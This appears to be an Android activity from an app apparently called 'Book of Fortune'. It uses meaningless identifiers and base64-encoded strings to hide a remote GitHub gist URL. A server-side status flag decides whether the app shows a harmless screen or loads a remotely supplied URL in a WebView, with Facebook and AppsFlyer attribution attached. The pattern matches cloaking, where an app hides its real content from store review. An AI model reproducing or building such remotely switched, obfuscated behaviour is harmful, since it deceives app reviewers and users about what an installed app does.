package net.bokok.fortin;

import static net.bokok.fortin.AppBF.viewMBF;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.applinks.AppLinkData;

import java.util.Map;

public class BF extends AppCompatActivity {


    private ConBF conBF;
    private String pac;
    private boolean hhh;
    private String susu = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjE5OTMyNC85MTc2YzNjM2VkMjhlZGY2YmM0MDQ4NTk3ODc0NTk0Ni9yYXcvQm9va29mRm9ydHVuZQ==";
    public static BF bbb;

    private void pppp() {
        String ggg = Context.CONNECTIVITY_SERVICE;
        ConnectivityManager nnnn = (ConnectivityManager) getSystemService(ggg);
        if (nnnn.getActiveNetworkInfo() == null) {
            hhh = false;

        } else {
            hhh = true;
        }
    }

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.bf);
        pac = getPackageName();
        pppp();
        bbb = this;


        if (!hhh) {
            startActivity(new Intent(getApplicationContext(), BFInter.class));
            finishAffinity();
        } else {

            String hddj = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(WeSeFB.decodeBF("c2F2ZWRVcmw="), WeSeFB.decodeBF("bnVsbA=="));

            if (hddj.equals(WeSeFB.decodeBF("bnVsbA=="))) {

            new Thread(new Runnable() {
                @Override
                public void run() {
                    conBF = viewMBF.getCon(susu);
                    if (conBF.getStatusBF().equals("0")) {
                        startActivity(new Intent(getApplicationContext(), BFButt.class));
                        finishAffinity();
                    } else {

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                viewMBF.flf(pac, conBF.getFbIdBF(), conBF.getFbTokenBF(), conBF.getUrlBF());
                                viewMBF.appsInBF(BF.this);
                                viewMBF.dsd(BF.this);
                                viewMBF.uu(BF.this);
                            }
                        });


                    }
                }
            }).start();

            } else {
                Intent intent = new Intent(getApplicationContext(),BFWeb.class);
                intent.putExtra("looo",hddj);
                startActivity(intent);
                finishAffinity();
            }
        }
    }
}
